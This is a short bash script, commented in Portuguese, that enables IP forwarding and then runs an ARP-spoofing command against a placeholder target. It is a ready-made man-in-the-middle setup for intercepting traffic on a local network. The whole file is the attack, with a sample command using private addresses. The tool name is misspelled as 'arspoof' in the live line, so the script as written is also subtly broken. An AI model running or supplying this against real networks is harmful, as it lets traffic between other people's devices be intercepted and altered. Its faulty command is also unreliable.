#!/bin/bash

# Ativar encaminhamento de pacotes:
# 1: Ativar | 0: Desativar
echo 1 > /proc/sys/net/ipv4/ip_forward

# Ex: sudo arpspoof -t 192.168.0.1 -r 192.168.122.1
sudo arspoof -t [TARGET IP] -r [NEW IP]
